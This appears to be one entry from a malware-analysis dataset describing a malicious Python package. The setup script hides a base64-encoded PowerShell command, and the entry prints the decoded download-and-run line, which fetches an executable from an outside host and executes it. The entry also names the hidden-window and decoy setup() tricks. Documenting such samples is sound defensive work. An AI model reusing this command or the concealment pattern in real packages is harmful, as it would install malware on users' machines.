      "malicious_behavior": "This code is malicious. It attempts to execute a hidden PowerShell command using a base64-encoded payload if a file or directory named 'tahg' does not exist. The encoded PowerShell command decodes to: 'Invoke-WebRequest -Uri \"https://esquelel0webhostapp.com/xEsquelesquad.exe\" -OutFile \"~/WindowsCache.exe\"; Invoke-Expression \"~/WindowsCache.exe\"'. This means the script downloads an executable from a remote server and runs it on the victim's machine, which is a classic method for delivering and executing malware. The use of subprocess.Popen with hidden window and encoded command is a common evasion technique. The rest of the code is a decoy setup() call to appear as a legitimate Python package. This behavior can lead to system compromise, data theft, or further malware infection.",
